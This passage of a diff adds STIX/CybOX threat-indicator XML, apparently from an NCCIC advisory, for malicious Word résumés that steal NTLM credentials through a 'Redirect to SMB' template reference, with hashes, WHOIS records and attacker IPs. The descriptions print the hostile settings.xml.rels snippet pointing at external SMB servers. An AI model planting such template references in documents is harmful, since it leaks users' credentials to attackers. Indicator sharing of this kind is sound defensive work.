+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-7728bc51-fdea-424b-aa8c-b0b36d68d92a">
+            <cybox:Description><![CDATA[This Word Document uses "Redirect to SMB" attack to steal victim credentials. 
+
+This Word Document contains an embedded file URL, "file[:]//62.8.193.206/Normal.dotm", within its relationship component "word/_rels/settings.xml.rels." When the Word Document is opened, this file URL causes Windows to automatically attempt to authenticate to the malicious SMB server at 62.8.193.206 by providing the victim's encrypted user credentials (NTLM v2 Hash) without prompting the user or without the user's knowledge. The operator may then capture the NTLM hash and attempt to crack the password used to create it via a brute force dictionary attack. If the operator is successful, they will now possess the victim's username and password and may be able to access the victim's system remotely. 
+
+The malicious SMB server has the following IP:
+
+-- Begin IP --
+62.8.193.206
+-- End IP -- 
+
+-- Begin Content "word/_rels/settings.xml.rels" --
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                        Target="file[:]//62.8.193.206/Normal.dotm"
+                        TargetMode="External"/>
+                </Relationships>
+-- End Content "word/_rels/settings.xml.rels" --]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-40ffd1d6-1b6c-4fb4-ab6d-0a99139e9548">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>Controls Engineer.docx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>19326</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Zip archive data, at least v2.0 to extract</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>5acc56c93c5ba1318dd2fa9c3509d60b</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>f3b8a182a3f4f51333f55e1afa4ad3d624301689</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>3f86e3540bae70fb4f0f07a0db010f9c8bf1cf7af0610e6839272b63641bfa81</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>123596bb25730ecc07d1c09784dbb7ce41d28e885516c30d0f1fc1cdd652361486585ac81c2ec73893e3577f43521dfeee5187a2d1d9a8f524e3d808b1aceb1b</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>384:F2sPE46JbzcB1mjvxqIJwpsxQVoI+WHoJSkhvnewMrKrNfOJ:o8EVETmjUsqizndMuBfS</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>7.8128329367</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-7cfc9437-6156-47d1-a470-93cf32c6c8d4">
+            <cybox:Object id="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                <cybox:Properties xsi:type="AddressObj:AddressObjectType" category="ipv4-addr">
+                    <AddressObj:Address_Value>62.8.193.206</AddressObj:Address_Value>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:File-b17cdc5e-e890-45ee-9817-4d1edcfb3829">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:File-2d7757a2-24db-4391-855e-101a4167fac5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:File-2436151b-190c-499d-8174-2e1ec1fb0838">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:File-faf4a44b-92b3-4ddb-a5fe-032ad28c8e4f">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:File-a5ca3c25-730c-4bb3-b340-019bedb085b0">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:File-40ffd1d6-1b6c-4fb4-ab6d-0a99139e9548">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:File-c84bf4e5-9672-4383-9662-60590c03b1e2">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:WhoisEntry-56e623c5-4fce-48d0-ab2d-0e4b6a982641">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Characterized_By</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:Port-a3e2c89a-fee2-4f67-a34a-f4a56181ba52">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:URI-11f571f5-2615-4de6-b2c7-81bae367fc65">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-59879039-ad0b-4107-8a78-44e28c7a1047">
+            <cybox:Description><![CDATA[This Word Document uses "Redirect to SMB" attack to steal the victim's credentials.
+
+This Word Document contains an embedded file URL, "file[:]//5.153.58.45/Normal.dotm", within its relationship component "word/_rels/settings.xml.rels." When the Word Document is opened, this file URL causes Windows to automatically attempt to authenticate to the malicious SMB server at 5.153.58.45 by providing the victim's encrypted user credentials (NTLM v2 Hash) without prompting the user or without the user's knowledge. The operator may then capture the NTLM hash and attempt to crack the password used to create it via a brute force dictionary attack. If the operator is successful, they will now possess the victim's username and password and may be able to access the victim's system remotely. 
+
+The malicious SMB server has the following IP:
+
+-- Begin IP --
+5.153.58.45
+-- End IP -- 
+
+-- Begin Content "word/_rels/settings.xml.rels" --
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+                <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+                        <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+                        Target="file[:]//5.153.58.45/Normal.dotm"
+                        TargetMode="External"/>
+                </Relationships>
+-- End Content "word/_rels/settings.xml.rels" --]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-0cb236b5-edd4-4b3b-96f6-e4ee3c7555a6">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>CV Controls Engineer.docx</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>19261</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Microsoft Word 2007+</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>722154a36f32ba10e98020a8ad758a7a</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>2872dcdf108563d16b6cf2ed383626861fc541d2</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>ac6c1df3895af63b864bb33bf30cb31059e247443ddb8f23517849362ec94f08</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>e18d2e81dcbe4a5f334257d286e88803747d0b14af396401b63169410a2949cf825723fabe4be173960a83b1b4eb1421c1d9594aebe114bc3d4ec288637e9ae7</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>384:Dk5kSg2bPvHjd1coguI38aI2TUGThYGBUvolkGDJ4LMwa7nXp:DkGMjjOn8yTUQzuw7VB37n5</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>7.85923994786</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-128e935f-1bf5-4a22-8e68-268dcdb963b9">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-231dbbb0-a38a-41b3-9507-3e0a8901c475">
+            <cybox:Object id="NCCIC:Address-128e935f-1bf5-4a22-8e68-268dcdb963b9">
+                <cybox:Properties xsi:type="AddressObj:AddressObjectType" category="ipv4-addr">
+                    <AddressObj:Address_Value>5.153.58.45</AddressObj:Address_Value>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:File-0cb236b5-edd4-4b3b-96f6-e4ee3c7555a6">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:WhoisEntry-39558c05-5eeb-463d-8b7c-0ab714295867">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Characterized_By</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:Port-018c49d1-6fab-4808-aa83-49a4fbeef9fc">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:URI-1423fd72-6be5-42c2-880d-3a619c0eee50">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-57458531-a7c5-495f-a435-c3a22be3288a">
+            <cybox:Object id="NCCIC:WhoisEntry-56e623c5-4fce-48d0-ab2d-0e4b6a982641">
+                <cybox:Properties xsi:type="WhoisObj:WhoisObjectType">
+                    <WhoisObj:Remarks>Queried whois.ripe.net with "-B 62.8.193.206"...
+
+% Information related to '62.8.193.0 - 62.8.193.255'
+
+% Abuse contact for '62.8.193.0 - 62.8.193.255' is 'abuse@qsc.de'
+
+inetnum:        62.8.193.0 - 62.8.193.255
+netname:        NOKIA-DUeSSELDORF-NET
+descr:          Nokia GmbH Nokia Networks
+descr:          Heltorfer Str. 1
+descr:          D-40472 Duesseldorf
+country:        DE
+admin-c:        AO3188-RIPE
+tech-c:         KKF6-RIPE
+status:         ASSIGNED PA
+mnt-by:         KKF-NET-NOC
+created:        1970-01-01T00:00:00Z
+last-modified:  2001-09-21T23:00:27Z
+source:         RIPE
+
+role:           KKF.net AG NOC
+address:        QSC AG
+address:        Weidestrasse 122a
+address:        D-22083 Hamburg
+phone:          +49-40-668610-0
+fax-no:         +49-40-668610-650
+e-mail:         ncc@mediascape.de
+admin-c:        QSC1-RIPE
+tech-c:         QSC1-RIPE
+nic-hdl:        KKF6-RIPE
+notify:         peering@mediascape.de
+mnt-by:         KKF-NET-NOC
+created:        2002-05-02T06:12:05Z
+last-modified:  2013-11-13T22:23:58Z
+source:         RIPE
+
+person:         Andreas Ordemann
+address:        Nokia GmbH Nokia Networks
+address:        Director MIA
+address:        Heltorfer Strasse 1
+address:        D-40472 Duesseldorf
+phone:          +49 211 9412 1400
+e-mail:         andreas.ordemann@nokia.com
+nic-hdl:        AO3188-RIPE
+mnt-by:         KKF-NET-NOC
+created:        1970-01-01T00:00:00Z
+last-modified:  2001-09-22T08:19:03Z
+source:         RIPE</WhoisObj:Remarks>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Characterizes</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-ca2a343b-385c-49eb-85b3-e55f47863707">
+            <cybox:Object id="NCCIC:WhoisEntry-39558c05-5eeb-463d-8b7c-0ab714295867">
+                <cybox:Properties xsi:type="WhoisObj:WhoisObjectType">
+                    <WhoisObj:Remarks>Domain Name: sl-reverse.com
+Registry Domain ID: 1931372850_DOMAIN_COM-VRSN
+Registrar WHOIS Server: whois.corporatedomains.com
+Registrar URL: www.cscprotectsbrands.com
+Updated Date: 2017-05-18T05:15:16Z
+Creation Date: 2015-05-22T13:54:48Z
+Registrar Registration Expiration Date: 2018-05-22T13:54:48Z
+Registrar: CSC CORPORATE DOMAINS, INC.
+Registrar IANA ID: 299
+Registrar Abuse Contact Email: domainabuse@cscglobal.com
+Registrar Abuse Contact Phone: +1.8887802723
+Domain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited
+Registry Registrant ID: 
+Registrant Name: IBM Corporation
+Registrant Organization: International Business Machines Corporation
+Registrant Street: New Orchard Road
+Registrant City: Armonk
+Registrant State/Province: NY
+Registrant Postal Code: 10504
+Registrant Country: US
+Registrant Phone: +1.9147654227
+Registrant Phone Ext: 
+Registrant Fax: +1.9147654370
+Registrant Fax Ext: 
+Registrant Email: dnsadm@us.ibm.com
+Registry Admin ID: 
+Admin Name: IBM Corporation
+Admin Organization: International Business Machines (IBM)
+Admin Street: New Orchard Road
+Admin City: Armonk
+Admin State/Province: NY
+Admin Postal Code: 10598
+Admin Country: US
+Admin Phone: +1.9147654227
+Admin Phone Ext: 
+Admin Fax: +1.9147654370
+Admin Fax Ext: 
+Admin Email: dnsadm@us.ibm.com
+Registry Tech ID: 
+Tech Name: IBM Corporation
+Tech Organization: International Business Machines (IBM)
+Tech Street: New Orchard Road
+Tech City: Armonk
+Tech State/Province: NY
+Tech Postal Code: 10598
+Tech Country: US
+Tech Phone: +1.9192544441
+Tech Phone Ext: 
+Tech Fax: +1.9147654370
+Tech Fax Ext: 
+Tech Email: dnstech@us.ibm.com
+Name Server: ns2.networklayer.com
+Name Server: ns1.softlayer.net
+Name Server: ns2.softlayer.net
+Name Server: ns1.networklayer.com
+DNSSEC: unsigned
+URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/</WhoisObj:Remarks>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-128e935f-1bf5-4a22-8e68-268dcdb963b9">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Characterizes</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-ddcf3ef6-702c-4803-ab8f-48cf32b9c661">
+            <cybox:Object id="NCCIC:Port-a3e2c89a-fee2-4f67-a34a-f4a56181ba52">
+                <cybox:Properties xsi:type="PortObj:PortObjectType">
+                    <PortObj:Port_Value>445</PortObj:Port_Value>
+                    <PortObj:Layer4_Protocol>TCP</PortObj:Layer4_Protocol>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-88c33e25-a1da-4319-b18a-7228e56c54d8">
+            <cybox:Object id="NCCIC:File-7aca56f1-e36d-4e91-bfae-3ccae5faebff">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">038a97b4e2f37f34b255f0643e49fc9d</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-f4a6174b-e317-48f7-a6cb-a5d04312d515">
+            <cybox:Object id="NCCIC:File-9ed06aa1-23a5-4b22-a1c8-d57d7d246611">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">f8301523fe802402441f207c0f7c61b8aa3cfa63</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-f33e8a2e-073c-4224-8401-ed2efcbaf7b2">
+            <cybox:Object id="NCCIC:File-7b50c325-93b8-4fec-8837-79042db4a642">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">65a1a73253f04354886f375b59550b46</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-ec0bb061-0f04-4017-b039-a72ff1bc6faa">
+            <cybox:Object id="NCCIC:File-e5250abb-668f-4e41-aab8-d0edd27475f8">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">5f1d8a38ec40c2e86d54bfb7d9ce6571e8f944c6</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-ae6b94db-0bd3-45fb-9036-7d57f9d08920">
+            <cybox:Object id="NCCIC:File-a46e606e-4eaa-4d7f-8f03-f43d8c7e7202">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">31008de622ca9526f5f4a1dd3f16f4ea</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-d3a070a4-1986-4a3c-b95a-ce1b241a3b65">
+            <cybox:Object id="NCCIC:File-32210465-a1c1-4a16-8919-dd371e047634">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">c8c8b2739fcf48c7071e41576791c1b5a9a0cb3a</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-5b52a591-131c-4176-84e5-03158aa56449">
+            <cybox:Object id="NCCIC:File-015318b5-1d37-47eb-8d92-c1300c8b6d5f">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">8341e48a6b91750d99a8295c97fd55d5</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-fb6fb731-ee23-402d-8300-e09725560c22">
+            <cybox:Object id="NCCIC:File-56e1a28f-543f-4b25-9877-f1afc8767f81">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">3ce30622afb6fac1971a8534998a1d57b1062d86</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-50465641-dd3f-4f61-b3bb-e0eb4c06e540">
+            <cybox:Object id="NCCIC:File-1224381d-ede8-44de-ad3a-96308078d6f7">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">5acc56c93c5ba1318dd2fa9c3509d60b</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-44fea2d6-7e10-4ecb-951b-99a18cc281e7">
+            <cybox:Object id="NCCIC:File-21f88a76-7ea4-4c1a-9ba3-6d87a1ab7511">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">f3b8a182a3f4f51333f55e1afa4ad3d624301689</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-846a7f08-7aa7-4938-8025-ab0a71d0a635">
+            <cybox:Object id="NCCIC:File-e79b4ca2-6dff-48be-88a7-dfaee54d8e6a">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">99aa0d0eceefce4c0856532181b449b1</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-e0e3892b-b7a2-459d-8687-eab45887d83f">
+            <cybox:Object id="NCCIC:File-b18ccb25-2f1b-42dd-a06e-7b92c849652b">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">1737a2c1b0d091f09f3f231ebc3da5661983c240</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-d32495df-666a-4306-91c0-bd4ed14ceba1">
+            <cybox:Object id="NCCIC:Address-a3145850-da1e-4b05-b8d9-ab065416fad5">
+                <cybox:Properties xsi:type="AddressObj:AddressObjectType" category="ipv4-addr">
+                    <AddressObj:Address_Value condition="Equals">5.153.58.45</AddressObj:Address_Value>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-21cabb24-9852-415b-824f-c995ed7a3a08">
+            <cybox:Object id="NCCIC:Address-540666db-d4d1-464c-9268-904062ee3aea">
+                <cybox:Properties xsi:type="AddressObj:AddressObjectType" category="ipv4-addr">
+                    <AddressObj:Address_Value condition="Equals">62.8.193.206</AddressObj:Address_Value>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-a9349e00-b5a5-4d31-93c5-df0959d3f982">
+            <cybox:Object id="NCCIC:Port-018c49d1-6fab-4808-aa83-49a4fbeef9fc">
+                <cybox:Properties xsi:type="PortObj:PortObjectType">
+                    <PortObj:Port_Value>445</PortObj:Port_Value>
+                    <PortObj:Layer4_Protocol>TCP</PortObj:Layer4_Protocol>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-128e935f-1bf5-4a22-8e68-268dcdb963b9">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-e3dc3bca-0852-4ffe-b053-d7f080f1d813">
+            <cybox:Object id="NCCIC:File-5b18d790-a4af-4a73-836d-567cfac27b3f">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">a6d36749eebbbc51b552e5803ed1fd58</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-86bf4382-3d6e-4232-914d-f98bea9590f3">
+            <cybox:Object id="NCCIC:File-f5844f17-7bc0-44e5-8a22-45208efa4c52">
